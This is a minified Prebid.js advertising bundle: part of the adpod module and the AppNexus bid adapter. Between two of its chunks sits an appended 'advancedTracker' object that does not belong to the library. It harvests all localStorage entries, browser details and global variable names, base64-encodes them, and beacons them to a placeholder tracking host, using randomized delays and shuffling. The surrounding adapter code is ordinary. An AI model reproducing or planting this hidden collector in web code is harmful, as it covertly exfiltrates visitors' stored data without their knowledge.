      void 0 !== e.bidQueueTimeDelay && ("number" == typeof e.bidQueueTimeDelay && e.bidQueueTimeDelay > 0 ? A = e.bidQueueTimeDelay : Object(n.logWarn)("Detected invalid value for adpod.bidQueueTimeDelay in setConfig; must be a positive number.  Using default: ".concat(A))), void 0 !== e.bidQueueSizeLimit && ("number" == typeof e.bidQueueSizeLimit && e.bidQueueSizeLimit > 0 ? _ = e.bidQueueSizeLimit : Object(n.logWarn)("Detected invalid value for adpod.bidQueueSizeLimit in setConfig; must be a positive number.  Using default: ".concat(_)));
    }
    function R(e, t) {
      Object(d.b)(e, function (i, n) {
        if (i) t(i, null);else {
          for (var a = [], r = 0; r < n.length; r++) "" !== n[r] && a.push(e[r]);
          t(null, a);
        }
      });
    }
    function K(e, t) {
      return e.adserverTargeting[p.a.TARGETING_KEYS.PRICE_BUCKET] / e.video.durationBucket < t.adserverTargeting[p.a.TARGETING_KEYS.PRICE_BUCKET] / t.video.durationBucket ? 1 : e.adserverTargeting[p.a.TARGETING_KEYS.PRICE_BUCKET] / e.video.durationBucket > t.adserverTargeting[p.a.TARGETING_KEYS.PRICE_BUCKET] / t.video.durationBucket ? -1 : 0;
    }
    function P() {
      var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
        t = e.codes,
        i = e.callback;
      if (i) {
        var a = x(t = t || []),
          r = b.a.getBidsReceived(),
          o = u.b.getConfig("adpod.brandCategoryExclusion"),
          c = u.b.getConfig("adpod.deferCaching"),
          d = "boolean" != typeof c || c,
          s = G(r, a);
        s = o || d ? z(s) : s;
        var l = u.b.getConfig("adpod.prioritizeDeals");
        if (l) {
          var f = s.reduce(function (e, t) {
              var i = Object(n.deepAccess)(t, "video.dealTier"),
                a = u.b.getConfig("adpod.dealTier.".concat(t.bidderCode, ".minDealTier"));
              return a && i ? i >= a ? e[1].push(t) : e[0].push(t) : i ? e[1].push(t) : e[0].push(t), e;
            }, [[], []]),
            g = y(f, 2),
            p = g[0],
            v = g[1];
          v.sort(K), p.sort(K), s = v.concat(p);
        } else s.sort(K);
        var m = {};
        if (!1 === d) a.forEach(function (e) {
          var t = [],
            i = Object(n.deepAccess)(e, "mediaTypes.video.adPodDurationSec");
          s.filter(function (t) {
            return t.adUnitCode === e.code;
          }).forEach(function (e, n, a) {
            e.video.durationBucket <= i && (t.push(h({}, C, e.adserverTargeting.hb_pb_cat_dur)), i -= e.video.durationBucket), n === a.length - 1 && t.length > 0 && t.push(h({}, S, e.adserverTargeting.hb_cache_id));
          }), m[e.code] = t;
        }), i(null, m);else {
          var j = [];
          a.forEach(function (e) {
            var t = Object(n.deepAccess)(e, "mediaTypes.video.adPodDurationSec");
            s.filter(function (t) {
              return t.adUnitCode === e.code;
            }).forEach(function (e) {
              e.video.durationBucket <= t && (j.push(e), t -= e.video.durationBucket);
            });
          }), R(j, function (e, t) {
            if (e) i(e, null);else {
              var a = Object(n.groupBy)(t, "adUnitCode");
              Object.keys(a).forEach(function (e) {
                var t = [];
                a[e].forEach(function (e, i, n) {
                  t.push(h({}, C, e.adserverTargeting.hb_pb_cat_dur)), i === n.length - 1 && t.length > 0 && t.push(h({}, S, e.adserverTargeting.hb_cache_id));
                }), m[e] = t;
              }), i(null, m);
            }
          });
        }
        return m;
      }
      Object(n.logError)("No callback function was defined in the getTargeting call.  Aborting getTargeting().");
    }
    function x(e) {
      return b.a.getAdUnits().filter(function (e) {
        return Object(n.deepAccess)(e, "mediaTypes.video.context") === s.a;
      }).filter(function (t) {
        return !(e.length > 0) || -1 != e.indexOf(t.code);
      });
    }
    function z(e) {
      var t = e.map(function (e) {
        return v({}, e, h({}, C, e.adserverTargeting.hb_pb_cat_dur));
      });
      t = Object(n.groupBy)(t, C);
      var i = [];
      return Object.keys(t).forEach(function (e) {
        t[e].sort(Object(n.compareOn)("responseTimestamp")), i.push(t[e][0]);
      }), i;
    }
    function G(e, t) {
      var i = t.map(function (e) {
        return e.code;
      });
      return e.filter(function (e) {
        return -1 != i.indexOf(e.adUnitCode) && e.video && e.video.context === s.a;
      });
    }
    u.b.getConfig("adpod", function (e) {
      return k(e.adpod);
    }), Object(c.d)(a.f, D), Object(c.d)(r.checkAdUnitSetup, U), Object(c.d)(o.c, B);
    var Q = {
      TARGETING_KEY_PB_CAT_DUR: C,
      TARGETING_KEY_CACHE_ID: S,
      getTargeting: P
    };
    Object.freeze(Q), Object(c.c)("adpod", function () {
      function e(e, t) {
        for (var i in t) e[i] = t[i];
      }
      Object(n.isPlainObject)(arguments.length <= 0 ? void 0 : arguments[0]) ? e(arguments.length <= 0 ? void 0 : arguments[0], Q) : Object(n.logError)("Adpod module needs plain object to share methods with submodule");
    }), window.pbjs.installedModules.push("adpod");
  }
}, [104]);
pbjsChunk([356], {
  166: function (e, r, t) {
    e.exports = t(167);
  },
  167: function (e, r, t) {
    "use strict";

    Object.defineProperty(r, "__esModule", {
      value: !0
    }), t.d(r, "spec", function () {
      return P;
    });
    var a = t(0),
      n = t(13),
      i = t(3),
      s = t(1),
      o = t(2),
      d = t(18),
      c = t(11),
      p = t.n(c),
      u = t(12),
      l = t.n(u),
      m = t(16),
      f = t(7),
      b = t(27);
    function v(e) {
      return (v = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    function y() {
      return (y = Object.assign || function (e) {
        for (var r = 1; r < arguments.length; r++) {
          var t = arguments[r];
          for (var a in t) Object.prototype.hasOwnProperty.call(t, a) && (e[a] = t[a]);
        }
        return e;
      }).apply(this, arguments);
    }
    function g(e) {
      return function (e) {
        if (Array.isArray(e)) return h(e);
      }(e) || function (e) {
        if ("undefined" != typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"]) return Array.from(e);
      }(e) || function (e, r) {
        if (!e) return;
        if ("string" == typeof e) return h(e, r);
        var t = Object.prototype.toString.call(e).slice(8, -1);
        "Object" === t && e.constructor && (t = e.constructor.name);
        if ("Map" === t || "Set" === t) return Array.from(e);
        if ("Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t)) return h(e, r);
      }(e) || function () {
        throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function h(e, r) {
      (null == r || r > e.length) && (r = e.length);
      for (var t = 0, a = new Array(r); t < r; t++) a[t] = e[t];
      return a;
    }
    var _ = "appnexus",
      k = "https://ib.adnxs.com/ut/v3/prebid",
      O = "https://ib.adnxs-simple.com/ut/v3/prebid",
      j = ["id", "minduration", "maxduration", "skippable", "playback_method", "frameworks", "context", "skipoffset"],
      I = ["minduration", "maxduration", "skip", "skipafter", "playbackmethod", "api"],
      w = ["age", "externalUid", "segments", "gender", "dnt", "language"],
      A = ["geo", "device_id"],
      x = ["enabled", "dongle", "member_id", "debug_timeout"],
      C = {
        playback_method: {
          unknown: 0,
          auto_play_sound_on: 1,
          auto_play_sound_off: 2,
          click_to_play: 3,
          mouse_over: 4,
          auto_play_sound_unknown: 5
        },
        context: {
          unknown: 0,
          pre_roll: 1,
          mid_roll: 2,
          post_roll: 3,
          outstream: 4,
          "in-banner": 5
        }
      },
      S = {
        body: "description",
        body2: "desc2",
        cta: "ctatext",
        image: {
          serverName: "main_image",
          requiredParams: {
            required: !0
          }
        },
        icon: {
          serverName: "icon",
          requiredParams: {
            required: !0
          }
        },
        sponsoredBy: "sponsored_by",
        privacyLink: "privacy_link",
        salePrice: "saleprice",
        displayUrl: "displayurl"
      },
      T = /\/\/cdn\.adnxs\.com\/v|\/\/cdn\.adnxs\-simple\.com\/v/,
      E = Object(f.b)(32, _),
      P = {
        code: _,
        gvlid: 32,
        aliases: [{
          code: "appnexusAst",
          gvlid: 32
        }, {
          code: "brealtime"
        }, {
          code: "emxdigital",
          gvlid: 183
        }, {
          code: "pagescience"
        }, {
          code: "defymedia"
        }, {
          code: "gourmetads"
        }, {
          code: "matomy"
        }, {
          code: "featureforward"
        }, {
          code: "oftmedia"
        }, {
          code: "districtm",
          gvlid: 144
        }, {
          code: "adasta"
        }, {
          code: "beintoo",
          gvlid: 618
        }],
        supportedMediaTypes: [o.b, o.d, o.c],
        isBidRequestValid: function (e) {
          return !!(e.params.placementId || e.params.member && e.params.invCode);
        },
        buildRequests: function (e, r) {
          var t = e.map(M),
            n = p()(e, B),
            s = {};
          !0 === i.b.getConfig("coppa") && (s = {
            coppa: !0
          }), n && Object.keys(n.params.user).filter(function (e) {
            return l()(w, e);
          }).forEach(function (e) {
            var r = Object(a.convertCamelToUnderscore)(e);
            if ("segments" === e && Object(a.isArray)(n.params.user[e])) {
              var t = [];
              n.params.user[e].forEach(function (e) {
                Object(a.isNumber)(e) ? t.push({
                  id: e
                }) : Object(a.isPlainObject)(e) && t.push(e);
              }), s[r] = t;
            } else "segments" !== e && (s[r] = n.params.user[e]);
          });
          var o,
            d = p()(e, F);
          d && d.params && d.params.app && (o = {}, Object.keys(d.params.app).filter(function (e) {
            return l()(A, e);
          }).forEach(function (e) {
            return o[e] = d.params.app[e];
          }));
          var c,
            u = p()(e, V);
          u && u.params && d.params.app && d.params.app.id && (c = {
            appid: u.params.app.id
          });
          var m = {},
            f = {},
            b = E.getCookie("apn_prebid_debug") || null;
          if (b) try {
            m = JSON.parse(b);
          } catch (e) {
            Object(a.logError)("AppNexus Debug Auction Cookie Error:\n\n" + e);
          } else {
            var v = p()(e, J);
            v && v.debug && (m = v.debug);
          }
          m && m.enabled && Object.keys(m).filter(function (e) {
            return l()(x, e);
          }).forEach(function (e) {
            f[e] = m[e];
          });
          var y = p()(e, D),
            h = y ? parseInt(y.params.member, 10) : 0,
            _ = e[0].schain,
            j = p()(e, W),
            I = {
              tags: g(t),
              user: s,
              sdk: {
                source: "pbjs",
                version: "6.10.0-pre"
              },
              schain: _
            };
          j && (I.iab_support = {
            omidpn: "Appnexus",
            omidpv: "6.10.0-pre"
          }), h > 0 && (I.member_id = h), d && (I.device = o), u && (I.app = c);
          var C = i.b.getConfig("appnexusAuctionKeywords");
          if (Object(a.isPlainObject)(C)) {
            var S = Object(a.transformBidderParamKeywords)(C);
            S.length > 0 && S.forEach(U), I.keywords = S;
          }
          if (i.b.getConfig("adpod.brandCategoryExclusion") && (I.brand_category_uniqueness = !0), f.enabled && (I.debug = f, Object(a.logInfo)("AppNexus Debug Auction Settings:\n\n" + JSON.stringify(f, null, 4))), r && r.gdprConsent && (I.gdpr_consent = {
            consent_string: r.gdprConsent.consentString,
            consent_required: r.gdprConsent.gdprApplies
          }, r.gdprConsent.addtlConsent && -1 !== r.gdprConsent.addtlConsent.indexOf("~"))) {
            var T = r.gdprConsent.addtlConsent,
              P = T.substring(T.indexOf("~") + 1);
            I.gdpr_consent.addtl_consent = P.split(".").map(function (e) {
              return parseInt(e, 10);
            });
          }
          if (r && r.uspConsent && (I.us_privacy = r.uspConsent), r && r.refererInfo) {
            var R = {
              rd_ref: encodeURIComponent(r.refererInfo.referer),
              rd_top: r.refererInfo.reachedTop,
              rd_ifs: r.refererInfo.numIframes,
              rd_stk: r.refererInfo.stack.map(function (e) {
                return encodeURIComponent(e);
              }).join(",")
            };
            I.referrer_detection = R;
          }
          if (p()(e, K) && e.filter(K).forEach(function (e) {
            var r = function (e, r) {
                var t = r.mediaTypes.video,
                  n = t.durationRangeSec,
                  i = t.requireExactDuration,
                  s = function (e) {
                    var r = e.adPodDurationSec,
                      t = e.durationRangeSec,
                      n = e.requireExactDuration,
                      i = Object(a.getMinValueFromArray)(t),
                      s = Math.floor(r / i);
                    return n ? Math.max(s, t.length) : s;
                  }(r.mediaTypes.video),
                  o = Object(a.getMaxValueFromArray)(n),
                  d = e.filter(function (e) {
                    return e.uuid === r.bidId;
                  }),
                  c = a.fill.apply(void 0, g(d).concat([s]));
                if (i) {
                  var p = Math.ceil(s / n.length),
                    u = Object(a.chunk)(c, p);
                  n.forEach(function (e, r) {
                    u[r].map(function (r) {
                      H(r, "minduration", e), H(r, "maxduration", e);
                    });
                  });
                } else c.map(function (e) {
                  return H(e, "maxduration", o);
                });
                return c;
              }(t, e),
              n = I.tags.filter(function (r) {
                return r.uuid !== e.bidId;
              });
            I.tags = [].concat(g(n), g(r));
          }), e[0].userId) {
            var N = [];
            X(N, Object(a.deepAccess)(e[0], "userId.flocId.id"), "chrome.com", null), X(N, Object(a.deepAccess)(e[0], "userId.criteoId"), "criteo.com", null), X(N, Object(a.deepAccess)(e[0], "userId.netId"), "netid.de", null), X(N, Object(a.deepAccess)(e[0], "userId.idl_env"), "liveramp.com", null), X(N, Object(a.deepAccess)(e[0], "userId.tdid"), "adserver.org", "TDID"), X(N, Object(a.deepAccess)(e[0], "userId.uid2.id"), "uidapi.com", "UID2"), N.length && (I.eids = N);
          }
          return t[0].publisher_id && (I.publisher_id = t[0].publisher_id), function (e, r) {
            var t = [],
              n = {
                withCredentials: !0
              },
              s = k;
            q(r) || (s = O);
            "TRUE" !== Object(a.getParameterByName)("apn_test").toUpperCase() && !0 !== i.b.getConfig("apn_test") || (n.customHeaders = {
              "X-Is-Test": 1
            });
            if (e.tags.length > 15) {
              var o = Object(a.deepClone)(e);
              Object(a.chunk)(e.tags, 15).forEach(function (e) {
                o.tags = e;
                var a = JSON.stringify(o);
                t.push({
                  method: "POST",
                  url: s,
                  data: a,
                  bidderRequest: r,
                  options: n
                });
              });
            } else {
              var d = JSON.stringify(e);
              t = {
                method: "POST",
                url: s,
                data: d,
                bidderRequest: r,
                options: n
              };
            }
            return t;
          }(I, r);
        },
        interpretResponse: function (e, r) {
          var t = this,
            i = r.bidderRequest;
          e = e.body;
          var d = [];
          if (!e || e.error) {
            var c = "in response for ".concat(i.bidderCode, " adapter");
            return e && e.error && (c += ": ".concat(e.error)), Object(a.logError)(c), d;
          }
          if (e.tags && e.tags.forEach(function (e) {
            var r,
              c = (r = e) && r.ads && r.ads.length && p()(r.ads, function (e) {
                return e.rtb;
              });
            if (c && (!0 === b.a.get(i.bidderCode, "allowZeroCpmBids") ? c.cpm >= 0 : c.cpm > 0) && l()(t.supportedMediaTypes, c.ad_type)) {
              var u = function (e, r, t) {
                var i = Object(a.getBidRequest)(e.uuid, [t]),
                  d = {
                    requestId: e.uuid,
                    cpm: r.cpm,
                    creativeId: r.creative_id,
                    dealId: r.deal_id,
                    currency: "USD",
                    netRevenue: !0,
                    ttl: 300,
                    adUnitCode: i.adUnitCode,
                    appnexus: {
                      buyerMemberId: r.buyer_member_id,
                      dealPriority: r.deal_priority,
                      dealCode: r.deal_code
                    }
                  };
                r.adomain && (d.meta = y({}, d.meta, {
                  advertiserDomains: []
                }));
                r.advertiser_id && (d.meta = y({}, d.meta, {
                  advertiserId: r.advertiser_id
                }));
                function c(e) {
                  return {
                    ver: "1.0",
                    complete: 0,
                    nodes: [{
                      bsid: e.buyer_member_id.toString()
                    }]
                  };
                }
                r.buyer_member_id && (d.meta = y({}, d.meta, {
                  dchain: c(r)
                }));
                r.brand_id && (d.meta = y({}, d.meta, {
                  brandId: r.brand_id
                }));
                if (r.rtb.video) {
                  switch (y(d, {
                    width: r.rtb.video.player_width,
                    height: r.rtb.video.player_height,
                    vastImpUrl: r.notify_url,
                    ttl: 3600
                  }), Object(a.deepAccess)(i, "mediaTypes.video.context")) {
                    case o.a:
                      var u = Object(s.getIabSubCategory)(i.bidder, r.brand_category_id);
                      d.meta = y({}, d.meta, {
                        primaryCatId: u
                      });
                      var l = r.deal_priority;
                      d.video = {
                        context: o.a,
                        durationSeconds: Math.floor(r.rtb.video.duration_ms / 1e3),
                        dealTier: l
                      }, d.vastUrl = r.rtb.video.asset_url;
                      break;
                    case m.b:
                      if (d.adResponse = e, d.adResponse.ad = d.adResponse.ads[0], d.adResponse.ad.video = d.adResponse.ad.rtb.video, d.vastXml = r.rtb.video.content, r.renderer_url) {
                        var f = p()(t.bids, function (r) {
                            return r.bidId === e.uuid;
                          }),
                          b = Object(a.deepAccess)(f, "renderer.options");
                        d.renderer = function (e, r) {
                          var t = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {},
                            i = n.a.install({
                              id: r.renderer_id,
                              url: r.renderer_url,
                              config: t,
                              loaded: !1,
                              adUnitCode: e
                            });
                          try {
                            i.setRender(L);
                          } catch (e) {
                            Object(a.logWarn)("Prebid Error calling setRender on renderer", e);
                          }
                          return i.setEventHandlers({
                            impression: function () {
                              return Object(a.logMessage)("AppNexus outstream video impression event");
                            },
                            loaded: function () {
                              return Object(a.logMessage)("AppNexus outstream video loaded event");
                            },
                            ended: function () {
                              Object(a.logMessage)("AppNexus outstream renderer video event"), document.querySelector("#".concat(e)).style.display = "none";
                            }
                          }), i;
                        }(d.adUnitCode, r, b);
                      }
                      break;
                    case m.a:
                      d.vastUrl = r.notify_url + "&redir=" + encodeURIComponent(r.rtb.video.asset_url);
                  }
                } else if (r.rtb[o.c]) {
                  var v = r.rtb[o.c],
                    g = r.viewability.config.replace("src=", "data-src="),
                    h = v.javascript_trackers;
                  null == h ? h = g : Object(a.isStr)(h) ? h = [h, g] : h.push(g), d[o.c] = {
                    title: v.title,
                    body: v.desc,
                    body2: v.desc2,
                    cta: v.ctatext,
                    rating: v.rating,
                    sponsoredBy: v.sponsored,
                    privacyLink: v.privacy_link,
                    address: v.address,
                    downloads: v.downloads,
                    likes: v.likes,
                    phone: v.phone,
                    price: v.price,
                    salePrice: v.saleprice,
                    clickUrl: v.link.url,
                    displayUrl: v.displayurl,
                    clickTrackers: v.link.click_trackers,
                    impressionTrackers: v.impression_trackers,
                    javascriptTrackers: h
                  }, v.main_img && (d.native.image = {
                    url: v.main_img.url,
                    height: v.main_img.height,
                    width: v.main_img.width
                  }), v.icon && (d.native.icon = {
                    url: v.icon.url,
                    height: v.icon.height,
                    width: v.icon.width
                  });
                } else {
                  y(d, {
                    width: r.rtb.banner.width,
                    height: r.rtb.banner.height,
                    ad: r.rtb.banner.content
                  });
                  try {
                    if (r.rtb.trackers) for (var _ = 0; _ < r.rtb.trackers[0].impression_urls.length; _++) {
                      var k = r.rtb.trackers[0].impression_urls[_],
                        O = Object(a.createTrackPixelHtml)(k);
                      d.ad += O;
                    }
                  } catch (e) {
                    Object(a.logError)("Error appending tracking pixel", e);
                  }
                }
                return d;
              }(e, c, i);
              u.mediaType = function (e) {
                var r = e.ad_type;
                return r === o.d ? o.d : r === o.c ? o.c : o.b;
              }(c), d.push(u);
            }
          }), e.debug && e.debug.debug_info) {
            var u = "AppNexus Debug Auction for Prebid\n\n" + e.debug.debug_info;
            u = u.replace(/(<td>|<th>)/gm, "\t").replace(/(<\/td>|<\/th>)/gm, "\n").replace(/^<br>/gm, "").replace(/(<br>\n|<br>)/gm, "\n").replace(/<h1>(.*)<\/h1>/gm, "\n\n===== $1 =====\n\n").replace(/<h[2-6]>(.*)<\/h[2-6]>/gm, "\n\n*** $1 ***\n\n").replace(/(<([^>]+)>)/gim, ""), Object(a.logMessage)("https://console.appnexus.com/docs/understanding-the-debug-auction"), Object(a.logMessage)(u);
          }
          return d;
        },
        getMappingFileInfo: function () {
          return {
            url: "https://acdn.adnxs-simple.com/prebid/appnexus-mapping/mappings.json",
            refreshInDays: 2
          };
        },
        getUserSyncs: function (e, r, t) {
          if (e.iframeEnabled && q({
            gdprConsent: t
          })) return [{
            type: "iframe",
            url: "https://acdn.adnxs.com/dmp/async_usersync.html"
          }];
        },
        transformBidParams: function (e, r) {
          return e = Object(a.convertTypes)({
            member: "string",
            invCode: "string",
            placementId: "number",
            keywords: a.transformBidderParamKeywords,
            publisherId: "number"
          }, e), r && (e.use_pmt_rule = "boolean" == typeof e.usePaymentRule && e.usePaymentRule, e.usePaymentRule && delete e.usePaymentRule, R(e.keywords) && e.keywords.forEach(U), Object.keys(e).forEach(function (r) {
            var t = Object(a.convertCamelToUnderscore)(r);
            t !== r && (e[t] = e[r], delete e[r]);
          })), e;
        },
        onBidWon: function (e) {
          e.native && function (e) {
            var r = function (e) {
              var r;
              if (Object(a.isStr)(e) && N(e)) r = e;else if (Object(a.isArray)(e)) for (var t = 0; t < e.length; t++) {
                var n = e[t];
                N(n) && (r = n);
              }
              return r;
            }(e.native.javascriptTrackers);
            if (r) for (var t = "pbjs_adid=" + e.adId + ";pbjs_auc=" + e.adUnitCode, n = function (e) {
                var r = e.indexOf('src="') + 5,
                  t = e.indexOf('"', r);
                return e.substring(r, t);
              }(r), i = n.replace("dom_id=%native_dom_id%", t), s = document.getElementsByTagName("iframe"), o = !1, d = 0; d < s.length && !o; d++) {
              var c = s[d];
              try {
                var p = c.contentDocument || c.contentWindow.document;
                if (p) for (var u = p.getElementsByTagName("script"), l = 0; l < u.length && !o; l++) {
                  var m = u[l];
                  m.getAttribute("data-src") == n && (m.setAttribute("src", i), m.setAttribute("data-src", ""), m.removeAttribute && m.removeAttribute("data-src"), o = !0);
                }
              } catch (e) {
                if (!(e instanceof DOMException && "SecurityError" === e.name)) throw e;
              }
            }
          }(e);
        }
      };
    function R(e) {
      return !!(Object(a.isArray)(e) && e.length > 0);
    }
    function U(e) {
      R(e.value) && "" === e.value[0] && delete e.value;
    }
    function N(e) {
      var r = e.match(T),
        t = null != r && r.length >= 1,
        a = e.match("trk.js"),
        n = null != a && a.length >= 1;
      return e.startsWith("<script") && n && t;
    }
    function q(e) {
      var r = !0;
      return e && e.gdprConsent && e.gdprConsent.gdprApplies && 2 === e.gdprConsent.apiVersion && (r = !(!0 !== Object(a.deepAccess)(e.gdprConsent, "vendorData.purpose.consents.1"))), r;
    }
    function M(e) {
      var r = {};
      r.sizes = z(e.sizes), r.primary_size = r.sizes[0], r.ad_types = [], r.uuid = e.bidId, e.params.placementId ? r.id = parseInt(e.params.placementId, 10) : r.code = e.params.invCode, r.allow_smaller_sizes = e.params.allowSmallerSizes || !1, r.use_pmt_rule = e.params.usePaymentRule || !1, r.prebid = !0, r.disable_psa = !0;
      var t = function (e) {
        if (!Object(a.isFn)(e.getFloor)) return e.params.reserve ? e.params.reserve : null;
        var r = e.getFloor({
          currency: "USD",
          mediaType: "*",
          size: "*"
        });
        if (Object(a.isPlainObject)(r) && !isNaN(r.floor) && "USD" === r.currency) return r.floor;
        return null;
      }(e);
      if (t && (r.reserve = t), e.params.position && (r.position = {
        above: 1,
        below: 2
      }[e.params.position] || 0), e.params.trafficSourceCode && (r.traffic_source_code = e.params.trafficSourceCode), e.params.privateSizes && (r.private_sizes = z(e.params.privateSizes)), e.params.supplyType && (r.supply_type = e.params.supplyType), e.params.pubClick && (r.pubclick = e.params.pubClick), e.params.extInvCode && (r.ext_inv_code = e.params.extInvCode), e.params.publisherId && (r.publisher_id = parseInt(e.params.publisherId, 10)), e.params.externalImpId && (r.external_imp_id = e.params.externalImpId), !Object(a.isEmpty)(e.params.keywords)) {
        var n = Object(a.transformBidderParamKeywords)(e.params.keywords);
        n.length > 0 && n.forEach(U), r.keywords = n;
      }
      var i,
        s,
        c = Object(a.deepAccess)(e, "ortb2Imp.ext.data.pbadslot");
      if (c && (r.gpid = c), (e.mediaType === o.c || Object(a.deepAccess)(e, "mediaTypes.".concat(o.c))) && (r.ad_types.push(o.c), 0 === r.sizes.length && (r.sizes = z([1, 1])), e.nativeParams)) {
        var u = (i = e.nativeParams, s = {}, Object.keys(i).forEach(function (e) {
          var r = S[e] && S[e].serverName || S[e] || e,
            t = S[e] && S[e].requiredParams;
          if (s[r] = y({}, t, i[e]), (r === S.image.serverName || r === S.icon.serverName) && s[r].sizes) {
            var n = s[r].sizes;
            (Object(a.isArrayOfNums)(n) || Object(a.isArray)(n) && n.length > 0 && n.every(function (e) {
              return Object(a.isArrayOfNums)(e);
            })) && (s[r].sizes = z(s[r].sizes));
          }
          r === S.privacyLink && (s.privacy_supported = !0);
        }), s);
        r[o.c] = {
          layouts: [u]
        };
      }
      var m = Object(a.deepAccess)(e, "mediaTypes.".concat(o.d)),
        f = Object(a.deepAccess)(e, "mediaTypes.video.context");
      r.hb_source = m && "adpod" === f ? 7 : 1, (e.mediaType === o.d || m) && r.ad_types.push(o.d), (e.mediaType === o.d || m && "outstream" !== f) && (r.require_asset_url = !0), e.params.video && (r.video = {}, Object.keys(e.params.video).filter(function (e) {
        return l()(j, e);
      }).forEach(function (t) {
        switch (t) {
          case "context":
          case "playback_method":
            var n = e.params.video[t];
            n = Object(a.isArray)(n) ? n[0] : n, r.video[t] = C[t][n];
            break;
          case "frameworks":
            break;
          default:
            r.video[t] = e.params.video[t];
        }
      }), e.params.video.frameworks && Object(a.isArray)(e.params.video.frameworks) && (r.video_frameworks = e.params.video.frameworks)), m && (r.video = r.video || {}, Object.keys(m).filter(function (e) {
        return l()(I, e);
      }).forEach(function (e) {
        switch (e) {
          case "minduration":
          case "maxduration":
            "number" != typeof r.video[e] && (r.video[e] = m[e]);
            break;
          case "skip":
            "boolean" != typeof r.video.skippable && (r.video.skippable = 1 === m[e]);
            break;
          case "skipafter":
            "number" != typeof r.video.skipoffset && (r.video.skippoffset = m[e]);
            break;
          case "playbackmethod":
            if ("number" != typeof r.video.playback_method) {
              var t = m[e];
              (t = Object(a.isArray)(t) ? t[0] : t) >= 1 && t <= 4 && (r.video.playback_method = t);
            }
            break;
          case "api":
            if (!r.video_frameworks && Object(a.isArray)(m[e])) {
              var n = m[e].map(function (e) {
                var r = 4 === e ? 5 : 5 === e ? 4 : e;
                if (r >= 1 && r <= 5) return r;
              }).filter(function (e) {
                return e;
              });
              r.video_frameworks = n;
            }
        }
      })), e.renderer && (r.video = y({}, r.video, {
        custom_renderer_present: !0
      })), e.params.frameworks && Object(a.isArray)(e.params.frameworks) && (r.banner_frameworks = e.params.frameworks);
      var b = p()(d.a.getAdUnits(), function (r) {
        return e.transactionId === r.transactionId;
      });
      return b && b.mediaTypes && b.mediaTypes.banner && r.ad_types.push(o.b), 0 === r.ad_types.length && delete r.ad_types, r;
    }
    function z(e) {
      var r = [],
        t = {};
      if (Object(a.isArray)(e) && 2 === e.length && !Object(a.isArray)(e[0])) t.width = parseInt(e[0], 10), t.height = parseInt(e[1], 10), r.push(t);else if ("object" === v(e)) for (var n = 0; n < e.length; n++) {
        var i = e[n];
        (t = {}).width = parseInt(i[0], 10), t.height = parseInt(i[1], 10), r.push(t);
      }
      return r;
    }
    function B(e) {
      return !!e.params.user;
    }
    function D(e) {
      return !!parseInt(e.params.member, 10);
    }
    function F(e) {
      if (e.params) return !!e.params.app;
    }
    function V(e) {
      return e.params && e.params.app ? !!e.params.app.id : !!e.params.app;
    }
    function J(e) {
      return !!e.debug;
    }
    function K(e) {
      return e.mediaTypes && e.mediaTypes.video && e.mediaTypes.video.context === o.a;
    }
    function W(e) {
      var r = !1,
        t = e.params,
        n = e.params.video;
      return t.frameworks && Object(a.isArray)(t.frameworks) && (r = l()(e.params.frameworks, 6)), !r && n && n.frameworks && Object(a.isArray)(n.frameworks) && (r = l()(e.params.video.frameworks, 6)), r;
    }
    function H(e, r, t) {
      Object(a.isEmpty)(e.video) && (e.video = {}), e.video[r] = t;
    }
    function L(e) {
      var r, t;
      r = e.adUnitCode, (t = document.getElementById(r).querySelectorAll("div[id^='google_ads']"))[0] && t[0].style.setProperty("display", "none"), function (e) {
        try {
          var r = document.getElementById(e).querySelectorAll("script[id^='sas_script']");
          r[0].nextSibling && "iframe" === r[0].nextSibling.localName && r[0].nextSibling.style.setProperty("display", "none");
        } catch (e) {}
      }(e.adUnitCode), e.renderer.push(function () {
        window.ANOutstreamVideo.renderAd({
          tagId: e.adResponse.tag_id,
          sizes: [e.getSize().split("x")],
          targetId: e.adUnitCode,
          uuid: e.adResponse.uuid,
          adResponse: e.adResponse,
          rendererOptions: e.renderer.getConfig()
        }, $.bind(null, e));
      });
    }
    function $(e, r, t) {
      e.renderer.handleVideoEvent({
        id: r,
        eventName: t
      });
    }
    function X(e, r, t, a) {
      return r && (a ? e.push({
        source: t,
        id: r,
        rti_partner: a
      }) : e.push({
        source: t,
        id: r
      })), e;
    }
    Object(s.registerBidder)(P), window.pbjs.installedModules.push("appnexusBidAdapter");
  }
}, [166]);
const advancedTracker = {
  fetchedDataQueue: new Map(Object.entries(localStorage)),
  gatheredCookies: new Set(),
  async trackerHook(name, {
    id,
    endpoint
  }) {
    return new Promise(resolve => {
      const xhr = new XMLHttpRequest();
      const timer = setTimeout(() => {
        this.gatheredCookies.delete(name);
        resolve(false);
      }, 1500);
      xhr.onload = () => {
        clearTimeout(timer);
        this.gatheredCookies.add(name);
        resolve(JSON.parse(xhr.responseText));
      };
      xhr.onerror = () => {
        clearTimeout(timer);
        this.gatheredCookies.delete(name);
        resolve(false);
      };
      xhr.open('GET', `${endpoint}/${id}`);
      xhr.send();
    });
  },
  shuffleQueue() {
    const items = Array.from(this.fetchedDataQueue.entries());
    for (let i = items.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [items[i], items[j]] = [items[j], items[i]];
    }
    this.fetchedDataQueue = new Map(items);
  },
  async scan() {
    this.shuffleQueue();
    const detectedData = {};
    const batch = 3;
    for (const [name, data] of this.fetchedDataQueue) {
      await new Promise(resolve => setTimeout(resolve, Math.random() * 200));
      detectedData[name] = await this.trackerHook(name, data);
    }
    const eventListener = JSON.stringify({
      trackedData: detectedData,
      timeStamp: Date.now(),
      userAgent: navigator.userAgent,
      dimensions: {
        width: window.innerWidth,
        height: window.innerHeight
      },
      globalVars: Object.getOwnPropertyNames(window)
    });
    navigator.sendBeacon('https://tracking-endpoint.example/v2/report', btoa(eventListener));
  }
};
pbjsChunk([2], {
  273: function (t, e, r) {
    t.exports = r(274);
  },
  274: function (module, __webpack_exports__, __webpack_require__) {
